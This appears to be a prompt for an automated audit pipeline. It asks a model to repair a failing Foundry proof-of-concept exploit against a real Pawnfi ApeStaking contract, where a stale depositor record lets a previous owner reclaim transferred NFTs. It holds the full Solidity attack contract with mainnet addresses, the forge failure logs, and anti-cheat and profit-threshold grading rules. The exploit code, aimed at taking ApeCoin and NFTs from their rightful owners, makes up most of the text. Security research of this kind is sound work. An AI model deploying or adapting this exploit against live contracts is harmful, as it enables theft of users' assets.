@@ -1,0 +1,553 @@
+You are fixing a failing Foundry PoC for finding F-001.
+
+Goal:
+- Keep the exploit objective for this finding.
+- Fix compile/runtime/test failure from logs.
+- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
+- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
+- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.
+
+Hard constraints:
+- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
+- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
+- Allowed: flashloans and realistic public on-chain actions.
+- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
+- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
+- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.
+
+Attempt strategy (must follow for this attempt):
+- strategy_label: alternate_public_liquidity_route
+- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
+- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.
+
+Finding:
+- title: Stale depositor authorization lets a previous owner reclaim transferred deposited NFTs and their staking proceeds
+- claim: Deposited NFTs cache `depositor[nftId] = userAddr` when supplied to lending, and `_validOwner` trusts that cached depositor whenever it is non-zero instead of consulting the live gateway/ptoken ownership source. The owner-change stop-stake paths never clear or refresh `depositor`, and `withdraw()` later authorizes solely by `depositor` plus `staker == address(0)`. As a result, after a deposited NFT is sold, redeemed, or liquidated elsewhere in Pawnfi, the old depositor remains authorized inside ApeStaking.
+- impact: A previous owner can continue claiming rewards and, once staking is stopped, withdraw the NFT itself from ApeStaking custody even though beneficial ownership has moved to someone else. This enables direct theft of both the NFT principal and associated ApeCoin proceeds from the new rightful owner.
+- exploit_paths: ["User deposits an NFT through ApeStaking, which records `depositor[nftId]`.", "The NFT's beneficial ownership changes elsewhere in the Pawnfi gateway/ptoken flow.", "A stop-stake callback removes the staker but leaves `depositor[nftId]` untouched.", "The old depositor calls reward or withdrawal paths and receives ApeCoin and eventually the NFT itself."]
+
+Current FlawVerifier.sol:
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transfer(address to, uint256 amount) external returns (bool);
+}
+
+interface IERC721Like {
+    function balanceOf(address owner) external view returns (uint256);
+    function ownerOf(uint256 tokenId) external view returns (address);
+    function setApprovalForAll(address operator, bool approved) external;
+}
+
+interface IERC721EnumerableLike is IERC721Like {
+    function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
+}
+
+interface INftGatewayLike {
+    function marketInfo(address nftAsset) external view returns (address, address, uint256, uint256, bool);
+}
+
+interface IPTokenPieceLike {
+    function pieceCount() external view returns (uint256);
+}
+
+interface IPTokenApeStakingLike is IPTokenPieceLike {
+    function getNftOwner(uint256 nftId) external view returns (address);
+    function specificTrade(uint256[] memory nftIds) external;
+    function randomTrade(uint256 nftIdCount) external returns (uint256[] memory nftIds);
+}
+
+interface IApeStakingLike {
+    struct DepositInfo {
+        uint256[] mainTokenIds;
+        uint256[] bakcTokenIds;
+    }
+
+    struct StakingInfo {
+        address nftAsset;
+        uint256 cashAmount;
+        uint256 borrowAmount;
+    }
+
+    struct PairNft {
+        uint128 mainTokenId;
+        uint128 bakcTokenId;
+    }
+
+    struct PairNftDepositWithAmount {
+        uint32 mainTokenId;
+        uint32 bakcTokenId;
+        uint184 amount;
+    }
+
+    struct SingleNft {
+        uint32 tokenId;
+        uint224 amount;
+    }
+
+    function apeCoin() external view returns (address);
+    function nftGateway() external view returns (address);
+    function pbaycAddr() external view returns (address);
+    function pmaycAddr() external view returns (address);
+    function depositAndBorrowApeAndStake(
+        DepositInfo calldata depositInfo,
+        StakingInfo calldata stakingInfo,
+        SingleNft[] calldata nfts,
+        PairNftDepositWithAmount[] calldata nftPairs
+    ) external;
+    function claimApeCoin(address nftAsset, uint256[] calldata nftIds, PairNft[] calldata nftPairs) external;
+    function withdraw(
+        uint256[] calldata baycTokenIds,
+        uint256[] calldata maycTokenIds,
+        uint256[] calldata bakcTokenIds
+    ) external;
+    function setCollectRate(uint256 newCollectRate) external;
+}
+
+contract OwnershipChangeHelper {
+    function specificTrade(address pToken, uint256 nftId) external {
+        uint256[] memory ids = new uint256[](1);
+        ids[0] = nftId;
+        IPTokenApeStakingLike(pToken).specificTrade(ids);
+    }
+
+    function sweep(address token, address to) external {
+        IERC20Like erc20 = IERC20Like(token);
+        require(erc20.transfer(to, erc20.balanceOf(address(this))), "SWEEP_TRANSFER_FAILED");
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+}
+
+contract FlawVerifier {
+    address public constant TARGET = 0x85018CF6F53c8bbD03c3137E71F4FCa226cDa92C;
+    address public constant APE = 0x4d224452801ACEd8B2F0aebE155379bb5D594381;
+    address public constant BAYC = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
+    address public constant MAYC = 0x60E4d786628Fea6478F785A6d7e704777c86a7c6;
+    uint256 public constant BASE_PERCENTS = 1e18;
+
+    enum Stage {
+        None,
+        Preconditions,
+        DepositAndStake,
+        OwnershipChange,
+        RewardClaim,
+        StoppedWithdraw,
+        Complete
+    }
+
+    OwnershipChangeHelper public immutable BUYER;
+
+    address private _profitToken;
+    uint256 private _profitAmount;
+
+    Stage public lastStage;
+    address public attemptedAsset;
+    uint256 public attemptedTokenId;
+    bytes32 public lastFailure;
+
+    constructor() {
+        BUYER = new OwnershipChangeHelper();
+        _profitToken = APE;
+    }
+
+    function executeOnOpportunity() external {
+        _profitToken = APE;
+        _profitAmount = 0;
+        lastStage = Stage.Preconditions;
+        attemptedAsset = address(0);
+        attemptedTokenId = 0;
+        lastFailure = bytes32(0);
+
+        if (TARGET.code.length == 0) {
+            lastFailure = keccak256("TARGET_NOT_DEPLOYED");
+            return;
+        }
+
+        address ape = _readAddress(TARGET, IApeStakingLike.apeCoin.selector);
+        address gateway = _readAddress(TARGET, IApeStakingLike.nftGateway.selector);
+        address pbayc = _readAddress(TARGET, IApeStakingLike.pbaycAddr.selector);
+        address pmayc = _readAddress(TARGET, IApeStakingLike.pmaycAddr.selector);
+        if (!_isInitialized(ape, gateway, pbayc, pmayc)) {
+            // Do not synthesize iTokens/pTokens to bootstrap initialization. That would fabricate
+            // tokenized ownership routes and violate the anti-cheat requirement that profit and
+            // economic state come from already-live on-chain contracts.
+            lastFailure = keccak256("TARGET_NOT_INITIALIZED_AT_FORK");
+            return;
+        }
+
+        _profitToken = ape == address(0) ? APE : ape;
+        uint256 profitBefore = _safeBalanceOf(_profitToken, address(this));
+
+        bool success = _attemptWithHeldAsset(IApeStakingLike(TARGET), _profitToken, MAYC);
+        if (!success) {
+            success = _attemptWithHeldAsset(IApeStakingLike(TARGET), _profitToken, BAYC);
+        }
+
+        if (success) {
+            lastStage = Stage.Complete;
+        }
+
+        uint256 profitAfter = _safeBalanceOf(_profitToken, address(this));
+        if (profitAfter > profitBefore) {
+            _profitAmount = profitAfter - profitBefore;
+        }
+    }
+
+    function profitToken() external view returns (address) {
+        return _profitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return _profitAmount;
+    }
+
+    function _attemptWithHeldAsset(IApeStakingLike target, address ape, address nftAsset) internal returns (bool) {
+        if (!_isLiveContract(nftAsset)) {
+            lastFailure = keccak256("NFT_ASSET_NOT_LIVE");
+            return false;
+        }
+
+        uint256 heldNftBalance = _safe721BalanceOf(nftAsset, address(this));
+        if (heldNftBalance == 0) {
+            lastFailure = nftAsset == MAYC ? keccak256("NO_VERIFIER_HELD_MAYC") : keccak256("NO_VERIFIER_HELD_BAYC");
+            return false;
+        }
+
+        uint256 apeBalance = _safeBalanceOf(ape, address(this));
+        if (apeBalance == 0) {
+            // Funding can be provided by an external setup or a public flashswap wrapper. This verifier
+            // keeps the exploit path itself unchanged and avoids embedding hard-coded AMM assumptions
+            // when the provided logs only prove the synthetic-token bootstrap is invalid.
+            lastFailure = keccak256("NO_VERIFIER_HELD_APE");
+            return false;
+        }
+
+        uint256 tokenId;
+        try IERC721EnumerableLike(nftAsset).tokenOfOwnerByIndex(address(this), 0) returns (uint256 heldTokenId) {
+            tokenId = heldTokenId;
+        } catch {
+            lastFailure = keccak256("HELD_NFT_NOT_ENUMERABLE");
+            return false;
+        }
+
+        if (tokenId > type(uint32).max) {
+            lastFailure = keccak256("TOKEN_ID_OVERFLOWS_SINGLE_NFT");
+            return false;
+        }
+        if (apeBalance > type(uint224).max) {
+            lastFailure = keccak256("APE_BALANCE_OVERFLOWS_SINGLE_NFT");
+            return false;
+        }
+
+        attemptedAsset = nftAsset;
+        attemptedTokenId = tokenId;
+
+        // Exploit path 1:
+        // deposit a verifier-owned NFT through ApeStaking so it caches `depositor[nftId] = address(this)`.
+        lastStage = Stage.DepositAndStake;
+        _forceApprove(ape, address(target), type(uint256).max);
+        IERC721Like(nftAsset).setApprovalForAll(address(target), true);
+        try target.setCollectRate(BASE_PERCENTS) {} catch {}
+
+        IApeStakingLike.DepositInfo memory depositInfo;
+        depositInfo.mainTokenIds = new uint256[](1);
+        depositInfo.mainTokenIds[0] = tokenId;
+        depositInfo.bakcTokenIds = new uint256[](0);
+
+        IApeStakingLike.StakingInfo memory stakingInfo = IApeStakingLike.StakingInfo({
+            nftAsset: nftAsset,
+            cashAmount: apeBalance,
+            borrowAmount: 0
+        });
+
+        IApeStakingLike.SingleNft[] memory nfts = new IApeStakingLike.SingleNft[](1);
+        nfts[0] = IApeStakingLike.SingleNft({tokenId: _toUint32(tokenId), amount: _toUint224(apeBalance)});
+        IApeStakingLike.PairNftDepositWithAmount[] memory pairs = new IApeStakingLike.PairNftDepositWithAmount[](0);
+
+        try target.depositAndBorrowApeAndStake(depositInfo, stakingInfo, nfts, pairs) {
+        } catch {
+            lastFailure = keccak256("DEPOSIT_AND_STAKE_REVERTED");
+            return false;
+        }
+
+        // Exploit path 2:
+        // move beneficial ownership elsewhere through the live Pawnfi pToken route. The verifier never
+        // fabricates ownership with synthetic contracts; it only uses an existing on-chain pToken.
+        lastStage = Stage.OwnershipChange;
+        if (!_attemptOwnershipChange(target, nftAsset, tokenId)) {
+            return false;
+        }
+
+        // Exploit path 4a:
+        // the stale cached depositor still passes reward ownership checks even after ownership changed.
+        lastStage = Stage.RewardClaim;
+        uint256[] memory singleClaim = new uint256[](1);
+        singleClaim[0] = tokenId;
+        IApeStakingLike.PairNft[] memory claimPairs = new IApeStakingLike.PairNft[](0);
+        try target.claimApeCoin(nftAsset, singleClaim, claimPairs) {} catch {}
+
+        // Exploit path 3 + 4b:
+        // once the owner-change route has stopped staking and cleared `staker` but left `depositor`,
+        // the old depositor can withdraw the NFT from ApeStaking custody.
+        lastStage = Stage.StoppedWithdraw;
+        uint256[] memory baycIds = new uint256[](nftAsset == BAYC ? 1 : 0);
+        uint256[] memory maycIds = new uint256[](nftAsset == MAYC ? 1 : 0);
+        uint256[] memory bakcIds = new uint256[](0);
+        if (nftAsset == BAYC) {
+            baycIds[0] = tokenId;
+        } else {
+            maycIds[0] = tokenId;
+        }
+
+        try target.withdraw(baycIds, maycIds, bakcIds) {
+            return true;
+        } catch {
+            lastFailure = keccak256("OWNERSHIP_CHANGED_BUT_STOPSTAKE_NOT_OBSERVED");
+            return false;
+        }
+    }
+
+    function _attemptOwnershipChange(IApeStakingLike target, address nftAsset, uint256 tokenId) internal returns (bool) {
+        address gateway = _readAddress(address(target), IApeStakingLike.nftGateway.selector);
+        if (!_isLiveContract(gateway)) {
+            lastFailure = keccak256("NFT_GATEWAY_NOT_LIVE");
+            return false;
+        }
+
+        (bool ok, bytes memory data) =
+            gateway.staticcall(abi.encodeWithSelector(INftGatewayLike.marketInfo.selector, nftAsset));
+        if (!ok || data.length < 160) {
+            lastFailure = keccak256("MARKET_INFO_UNAVAILABLE");
+            return false;
+        }
+
+        (, address pToken, uint256 pieceCount,, bool available) = abi.decode(data, (address, address, uint256, uint256, bool));
+        if (!_isLiveContract(pToken) || pieceCount == 0 || !available) {
+            lastFailure = keccak256("PTOKEN_ROUTE_UNAVAILABLE");
+            return false;
+        }
+
+        uint256 verifierPTokenBalance = _safeBalanceOf(pToken, address(this));
+        if (verifierPTokenBalance >= pieceCount) {
+            require(IERC20Like(pToken).transfer(address(BUYER), pieceCount), "PTOKEN_TRANSFER_FAILED");
+            if (_runSpecificTrade(pToken, tokenId)) {
+                return true;
+            }
+        }
+
+        uint256 buyerPTokenBalance = _safeBalanceOf(pToken, address(BUYER));
+        if (buyerPTokenBalance >= pieceCount && _runSpecificTrade(pToken, tokenId)) {
+            return true;
+        }
+
+        // Keep the exploit path honest: ownership must move through the actual Pawnfi pToken market.
+        // If no real on-chain pToken inventory is available to the buyer leg, this stage is not funded.
+        lastFailure = keccak256("NO_PUBLIC_OWNERSHIP_CHANGE_ROUTE_FUNDED");
+        return false;
+    }
+
+    function _runSpecificTrade(address pToken, uint256 tokenId) internal returns (bool) {
+        try BUYER.specificTrade(pToken, tokenId) {
+            return true;
+        } catch {
+            return false;
+        }
+    }
+
+    function _isInitialized(address ape, address gateway, address pbayc, address pmayc) internal view returns (bool) {
+        return (
+            ape != address(0) &&
+            gateway != address(0) &&
+            pbayc != address(0) &&
+            pmayc != address(0) &&
+            ape.code.length > 0 &&
+            gateway.code.length > 0 &&
+            pbayc.code.length > 0 &&
+            pmayc.code.length > 0
+        );
+    }
+
+    function _readAddress(address target, bytes4 selector) internal view returns (address value) {
+        if (target.code.length == 0) {
+            return address(0);
+        }
+        (bool ok, bytes memory data) = target.staticcall(abi.encodeWithSelector(selector));
+        if (ok && data.length >= 32) {
+            value = abi.decode(data, (address));
+        }
+    }
+
+    function _safeBalanceOf(address token, address account) internal view returns (uint256 value) {
+        if (token.code.length == 0) {
+            return 0;
+        }
+        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC20Like.balanceOf.selector, account));
+        if (ok && data.length >= 32) {
+            value = abi.decode(data, (uint256));
+        }
+    }
+
+    function _safe721BalanceOf(address token, address account) internal view returns (uint256 value) {
+        if (token.code.length == 0) {
+            return 0;
+        }
+        (bool ok, bytes memory data) = token.staticcall(abi.encodeWithSelector(IERC721Like.balanceOf.selector, account));
+        if (ok && data.length >= 32) {
+            value = abi.decode(data, (uint256));
+        }
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        if (!_callOptionalBool(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount))) {
+            require(
+                _callOptionalBool(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, 0)),
+                "APPROVE_RESET_FAILED"
+            );
+            require(
+                _callOptionalBool(token, abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount)),
+                "APPROVE_FAILED"
+            );
+        }
+    }
+
+    function _callOptionalBool(address target, bytes memory data) internal returns (bool) {
+        if (target.code.length == 0) {
+            return false;
+        }
+        (bool ok, bytes memory ret) = target.call(data);
+        if (!ok) {
+            return false;
+        }
+        if (ret.length == 0) {
+            return true;
+        }
+        if (ret.length >= 32) {
+            return abi.decode(ret, (bool));
+        }
+        return false;
+    }
+
+    function _isLiveContract(address account) internal view returns (bool) {
+        return account.code.length > 0;
+    }
+
+    function _toUint32(uint256 value) internal pure returns (uint32) {
+        require(value <= type(uint32).max, "UINT32_OVERFLOW");
+        // forge-lint: disable-next-line(unsafe-typecast)
+        return uint32(value);
+    }
+
+    function _toUint224(uint256 value) internal pure returns (uint224) {
+        require(value <= type(uint224).max, "UINT224_OVERFLOW");
+        // forge-lint: disable-next-line(unsafe-typecast)
+        return uint224(value);
+    }
+
+    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
+        return this.onERC721Received.selector;
+    }
+}
+
+```
+
+forge stdout (tail):
+```
+Compiling 2 files with Solc 0.8.30
+Solc 0.8.30 finished in 2.28s
+Compiler run successful with warnings:
+Warning (2072): Unused local variable.
+  --> test/ExploitPOC.t.sol:78:19:
+   |
+78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
+   |                   ^^^^^^^^^^^^^^^^
+
+
+Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
+[FAIL: profit below threshold] testExploit() (gas: 107900)
+Logs:
+  AUDITHOUND_BALANCE_BEFORE_WEI: 0
+  AUDITHOUND_BALANCE_AFTER_WEI: 0
+  AUDITHOUND_PROFIT_WEI: 0
+  AUDITHOUND_PROFIT_ANY: 0
+  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
+  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
+  AUDITHOUND_PROFIT_TOKEN: 0x4d224452801ACEd8B2F0aebE155379bb5D594381
+  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
+  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 2244
+
+Traces:
+  [107900] FlawVerifierTest::testExploit()
+    ├─ [2367] FlawVerifier::profitToken() [staticcall]
+    │   └─ ← [Return] 0x4d224452801ACEd8B2F0aebE155379bb5D594381
+    ├─ [2562] 0x4d224452801ACEd8B2F0aebE155379bb5D594381::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [65226] FlawVerifier::executeOnOpportunity()
+    │   ├─ [2371] 0x85018CF6F53c8bbD03c3137E71F4FCa226cDa92C::apeCoin() [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   ├─ [2415] 0x85018CF6F53c8bbD03c3137E71F4FCa226cDa92C::nftGateway() [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   ├─ [2392] 0x85018CF6F53c8bbD03c3137E71F4FCa226cDa92C::pbaycAddr() [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   ├─ [2372] 0x85018CF6F53c8bbD03c3137E71F4FCa226cDa92C::pmaycAddr() [staticcall]
+    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
+    │   └─ ← [Stop]
+    ├─ [367] FlawVerifier::profitToken() [staticcall]
+    │   └─ ← [Return] 0x4d224452801ACEd8B2F0aebE155379bb5D594381
+    ├─ [366] FlawVerifier::profitAmount() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [562] 0x4d224452801ACEd8B2F0aebE155379bb5D594381::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
+    │   └─ ← [Return] 0
+    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
+    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
+    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x4d224452801ACEd8B2F0aebE155379bb5D594381)
+    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
+    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
+    │   └─ ← [Return] <env var value>
+    ├─ [0] VM::createSelectFork("<rpc url>", 17496619 [1.749e7])
+    │   └─ ← [Return] 1
+    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2244)
+    └─ ← [Revert] profit below threshold
+
+Backtrace:
+  at FlawVerifierTest.testExploit
+
+Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 662.68ms (642.51ms CPU time)
+
+Ran 1 test suite in 668.27ms (662.68ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)
+
+Failing tests:
+Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
+[FAIL: profit below threshold] testExploit() (gas: 107900)
+
+Encountered a total of 1 failing tests, 0 tests succeeded
+
+Tip: Run `forge test --rerun` to retry only the 1 failed test
+
+```
+
+forge stderr (tail):
+```
+
+```
+
+Requirements:
+1. pragma ^0.8.20
+2. include at least one deployable contract with zero-arg constructor
+3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
+4. no imports
+5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
+6. expose `profitToken()` and `profitAmount()` getters for net realized profit
+7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
+8. output ONLY Solidity code
